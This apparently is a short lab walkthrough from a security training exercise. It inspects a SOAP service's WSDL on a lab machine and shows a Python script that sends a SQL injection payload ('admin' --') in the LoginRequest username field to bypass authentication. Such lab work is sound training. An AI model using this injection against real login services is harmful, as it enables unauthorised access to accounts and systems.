![[Pasted image 20231218163536.png]]

Identifying the XML

![[Pasted image 20231218163814.png]]

After spawning the target machine, students need to inspect the WSDL file of the SOAP service that resides in `http://10.129.230.116:3002/wsdl?wsdl`, to find that there is a SOAPAction called `LoginRequest` with two parameters, `username` and `password`:

```
import requests

payload = "admin' --"
data = f'<?xml version="1.0" encoding="UTF-8"?> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:tns="http://tempuri.org/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <soap:Body> <LoginRequest xmlns="http://tempuri.org/"> <username>{payload}</username> <password>fff</password> </LoginRequest> </soap:Body> </soap:Envelope>'

print(requests.post("http://10.129.230.116:3002/wsdl", data=data, headers={"SOAPAction":'"Login"'}).content)
```

![[Pasted image 20231218164533.png]]